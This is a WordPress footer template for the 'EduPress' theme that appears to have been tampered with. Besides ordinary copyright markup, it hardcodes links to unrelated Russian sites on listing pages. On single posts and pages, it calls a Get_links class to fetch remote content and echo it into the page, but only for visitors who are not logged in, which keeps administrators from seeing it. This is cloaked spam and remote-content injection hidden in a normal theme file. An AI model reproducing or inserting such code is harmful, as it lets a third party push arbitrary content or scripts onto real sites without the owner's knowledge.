<?php
/**
 * The template for displaying the footer.
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package EduPress
 */

$ilovewp_logo = get_template_directory_uri() . '/images/ilovewp-logo-white.png';

?>

	<footer class="site-footer" role="contentinfo">
	
		<?php get_sidebar( 'footer' ); ?>
		
		<div class="wrapper wrapper-copy">
			<p class="copy"><?php _e('Copyright &copy;','edupress');?> <?php echo date_i18n(__("Y","edupress")); ?> <?php bloginfo('name'); ?>. <?php _e('All Rights Reserved', 'edupress');?>. </p>
			<p class="copy-ilovewp"><span class="theme-credit"><?php if (is_home() || is_category() || is_archive() ){ ?> <a href="http://wp-templates.ru/" title="Шаблоны WordPress">WordPress</a> / <a href="http://rastenievod.com/" title="Уход за домашними цветами" target="_blank">Цветы</a><?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?>
</span></p>
		</div><!-- .wrapper .wrapper-copy -->
	
	</footer><!-- .site-footer -->

</div><!-- end #container -->

<?php wp_footer(); ?>

</body>
</html>